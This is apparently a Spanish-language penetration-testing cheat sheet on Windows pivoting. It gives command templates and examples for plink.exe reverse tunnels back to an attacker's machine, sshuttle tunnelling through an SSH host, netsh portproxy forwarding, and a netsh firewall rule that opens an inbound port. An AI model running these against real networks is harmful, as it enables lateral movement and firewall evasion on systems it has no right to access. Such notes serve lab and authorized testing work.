
# Windows Pivoting Tools + Netsh advfirewall add Rule

- plink.exe -- Modo de uso
```bash
cmd.exe /c echo y | plink.exe -l <usuario> -pw <contraseña> <ip mia de atacante> -R <puerto que abrimos en mi maquina atacante>:<host de quien queremos tunelizar>:<puerto que queremos tunelizar>
```
_ejemplo: `cmd.exe /c echo | plink.exe -l pro -pw hola 192.168.10.10 -R 80:192.168.20.20:80 -R 2222:192.168.20.20:22 -N `

- sshuttle 
```bash
sshuttle -r <usuario>@<servidor ssh> <ip de red en la que operará la vpn>/<máscara de red en CIDR>
sshuttle -r <usuario>@<servidor ssh> --ssh-cmd "ssh -i <archivo clave privada>" <ip de red en la que operará la vpn>/<máscara de red en CIDR> --dns
sshuttle -r <usuario>@<servidor ssh> <ip de red en la que operará la vpn>/<máscara de red en CIDR> -x <servidor ssh> --dns -D (conexion en segundo plano)
```
ejemplo_: `sshuttle -r user@192.168.10.10 --ssh-cmd "ssh -i id_rsa" 192.168.20.0/24`

- Netsh
_comandos_ : `netsh interface portproxy show all`  `netsh interface portproxy reset`
             `netsh advfirewall firewall add rule name=<nombre de la regla> protocol=TCP dir=in localport=<puerto> action=allow`
```bash
netsh interface portproxy add v4tov4 listenport=<puerto a escuchar> listenaddress=<direccion a escuchar> connectport=<puerto a conectar> connectaddress=<direccion a conectar>
```

ejemplo_: `netsh interface portproxy add v4tov4 listenport=777 listenaddress=192.168.10.40 connectport=80 connectaddress=192.168.20.20`
